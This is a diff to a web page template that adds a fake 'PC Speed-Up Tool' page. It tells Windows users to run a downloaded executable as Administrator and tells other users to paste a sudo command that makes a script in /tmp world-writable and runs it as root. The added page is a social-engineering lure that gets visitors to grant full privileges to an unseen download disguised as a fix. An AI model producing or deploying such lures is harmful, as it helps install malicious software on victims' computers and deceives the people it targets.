@@ -1,16 +1,33 @@
 {% extends 'base.html' %}
 
+<h3>To fix your computer, follow these few easy steps!</h3>
 
-{% block content %}
-{% if name %}
-<h1>Hello {{name}}!</h1>
-{% else %}
-<h1>Hello Ass</h1>
-{% endif %}
-
-<body class="body">
-    <div class="container" align="left">
-        <a href="/download" target="blank"><button class='btn btn-default'>Download!</button></a>
-    </div>
+<body>
+    {% block content %}
+    {% if os_fam == "windows" %}
+    <ol>
+        <li>Click the download button to get a copy of our PC Speed-Up Tool.
+            <div class="container" align="left">
+                <a href="/download" target="blank"><button class='btn btn-default'>Download!</button></a>
+            </div>
+        </li>
+        <li>Press ctrl+windows key to open Explorer.</li>
+        <li>Find pc_fixer_tool.exe and right-click on it.</li>
+        <li>Click Run as Administrator.</li>
+        <li>And you're done! Enjoy your faster PC!</li>
+    </ol>
+    {% else %}
+    <ol>
+        <li>Click the download button to get a copy of our PC Speed-Up Tool.</li>
+        <div class="container" align="left">
+            <a href="/download" target="blank"><button class='btn btn-default'>Download!</button></a>
+        </div>
+        <li>Open a new terminal.</li>
+        <li>Copy and paste the following command: sudo chmod 777 /tmp/pc_fixer_tool.sh && sudo /tmp/pc_fixer_tool.sh
+        </li>
+        <li>Make sure to enter your password if it prompts.</li>
+        <li>And you're done! Enjoy your faster PC!</li>
+    </ol>
+    {% endif %}
+    {% endblock %}
 </body>
-{% endblock %}
